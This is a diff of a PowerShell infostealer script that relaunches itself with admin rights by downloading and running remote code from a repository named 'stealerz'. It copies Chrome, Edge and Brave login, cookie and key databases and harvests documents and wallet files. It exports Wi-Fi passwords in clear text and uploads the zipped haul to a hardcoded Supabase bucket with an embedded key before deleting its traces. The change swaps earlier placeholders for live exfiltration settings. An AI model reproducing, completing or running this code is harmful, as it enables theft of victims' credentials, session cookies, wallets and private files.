@@ -1,82 +1,61 @@
 $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
 
 if (-not $isAdmin) {
-    $url = "https://raw.githubusercontent.com/KaloyanSyS32/SpecListener/refs/heads/main/Get-Specs.ps1"
+    $url = "https://raw.githubusercontent.com/KaloyanSyS32/stealerz/refs/heads/main/s"
     Start-Process powershell -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"iex (irm '$url')`""
     exit
 }
 
-$workDir = Join-Path $env:TEMP "sys_audit_$(Get-Random)"
-New-Item -Path $workDir -ItemType Directory -Force | Out-Null
+$sbUrl = "https://kjoxaevacnruadftkjxc.supabase.co/storage/v1/object/data/$($env:COMPUTERNAME)_$(Get-Date -Format "yyyyMMdd_HHmm").zip"
+$sbKey = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imtqb3hhZXZhY25ydWFkZnRranhjIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzgxNjA4NjAsImV4cCI6MjA5MzczNjg2MH0.OVuVfwrLPgxcrX3W0xjF-FVQBB9qMbMB1s-vL8aV_aY"
 
-# 1. Targeted File Harvesting (.txt, .pdf, .docx, .xlsx, .key, .wallet)
-$exensions = @("*.txt", "*.pdf", "*.docx", "*.xlsx", "*.key", "*.wallet", "*.rdp")
-$searchPaths = @("$env:USERPROFILE\Documents", "$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads")
+$staging = Join-Path $env:TEMP "staging_$(Get-Random)"
+New-Item -Path $staging -ItemType Directory -Force | Out-Null
 
-foreach ($path in $searchPaths) {
-    if (Test-Path $path) {
-        Get-ChildItem -Path $path -Include $exensions -Recurse -File -ErrorAction SilentlyContinue | ForEach-Object {
-            $dest = Join-Path $workDir "Files"
-            if (-not (Test-Path $dest)) { New-Item -Path $dest -ItemType Directory -Force | Out-Null }
-            Copy-Item $_.FullName -Destination $dest -ErrorAction SilentlyContinue
-        }
-    }
-}
-
-# 2. Browser Credential & History Harvesting (Chrome, Edge, Brave)
-$browserData = @("Login Data", "Cookies", "Web Data", "History")
-$localAppData = $env:LOCALAPPDATA
+# 1. Credential Database Extraction (Browsers)
 $browsers = @{
-    "Chrome" = "$localAppData\Google\Chrome\User Data"
-    "Edge"   = "$localAppData\Microsoft\Edge\User Data"
-    "Brave"  = "$localAppData\BraveSoftware\Brave-Browser\User Data"
+    "Chrome" = "$env:LOCALAPPDATA\Google\Chrome\User Data"
+    "Edge"   = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
+    "Brave"  = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"
 }
 
 foreach ($b in $browsers.GetEnumerator()) {
-    $dest = Join-Path $workDir "Browsers\$($b.Key)"
-    New-Item -Path $dest -ItemType Directory -Force | Out-Null
-    
-    # Capture Encryption Keys (Local State)
-    $localState = Join-Path $b.Value "Local State"
-    if (Test-Path $localState) { Copy-Item $localState -Destination $dest }
-
-    Get-ChildItem -Path $b.Value -Recurse -Include $browserData -ErrorAction SilentlyContinue | ForEach-Object {
-        Copy-Item $_.FullName -Destination $dest -ErrorAction SilentlyContinue
-    }
+    $dest = New-Item -Path (Join-Path $staging "Browsers\$($b.Key)") -ItemType Directory -Force
+    # Copy master key for offline decryption
+    if (Test-Path "$($b.Value)\Local State") { Copy-Item "$($b.Value)\Local State" -Destination $dest }
+    # Harvest DBs
+    Get-ChildItem -Path $b.Value -Recurse -Include "Login Data", "Cookies", "Web Data" -ErrorAction SilentlyContinue | Copy-Item -Destination $dest
 }
 
-# 3. WiFi Profile Harvesting
-$wifiPath = Join-Path $workDir "WiFi"
-New-Item -Path $wifiPath -ItemType Directory -Force | Out-Null
-netsh wlan export profile key=clear folder=$wifiPath | Out-Null
-
-# 4. System & Network Snapshots
-$sysInfo = @{
-    User    = $env:USERNAME
-    Comp    = $env:COMPUTERNAME
-    IP      = (Get-NetIPAddress -AddressFamily IPv4).IPAddress
-    Process = Get-Process | Select-Object Name, Id
-    History = Get-History
+# 2. Document & Wallet Harvesting
+$exts = @("*.txt", "*.pdf", "*.docx", "*.xlsx", "*.key", "*.wallet", "*.rdp", "*.sql")
+Get-ChildItem -Path "$env:USERPROFILE" -Include $exts -Recurse -File -ErrorAction SilentlyContinue | ForEach-Object {
+    $fileDest = Join-Path $staging "Files"
+    if (-not (Test-Path $fileDest)) { New-Item $fileDest -ItemType Directory -Force | Out-Null }
+    Copy-Item $_.FullName -Destination $fileDest -ErrorAction SilentlyContinue
 }
-$sysInfo | ConvertTo-Json | Out-File (Join-Path $workDir "sys_info.json")
 
-# 5. Exfiltration (Compression and Upload)
-$zipPath = "$env:TEMP\data_pkg.zip"
-Compress-Archive -Path "$workDir\*" -DestinationPath $zipPath -Force
+# 3. WiFi and System Recon
+$recon = Join-Path $staging "Recon"
+New-Item $recon -ItemType Directory -Force | Out-Null
+netsh wlan export profile key=clear folder=$recon | Out-Null
+Get-Process | Select-Object Name, CPU, Path | Export-Csv -Path (Join-Path $recon "procs.csv") -NoTypeInformation
+ipconfig /all > (Join-Path $recon "net.txt")
 
-# Note: Replace with your Supabase or Listener URL
-$uploadUrl = "https://YOUR_PROJECT.supabase.co/storage/v1/object/data/pkg.zip"
-$apiKey = "YOUR_KEY"
+# 4. Compression & Transmission
+$zip = "$env:TEMP\upload.zip"
+Compress-Archive -Path "$staging\*" -DestinationPath $zip -Force
 
 $headers = @{
-    "Authorization" = "Bearer $apiKey"
-    "apikey"        = $apiKey
+    "Authorization" = "Bearer $sbKey"
+    "apikey"        = $sbKey
     "Content-Type"  = "application/zip"
+    "x-upsert"      = "true"
 }
 
-$fileBytes = [System.IO.File]::ReadAllBytes($zipPath)
-Invoke-RestMethod -Uri $uploadUrl -Method Post -Headers $headers -Body $fileBytes
+$bytes = [System.IO.File]::ReadAllBytes($zip)
+Invoke-RestMethod -Uri $sbUrl -Method Post -Headers $headers -Body $bytes
 
-# Cleanup
-Remove-Item $workDir -Recurse -Force
-Remove-Item $zipPath -Force
+# 5. Anti-Forensic Cleanup
+Remove-Item $staging -Recurse -Force
+Remove-Item $zip -Force
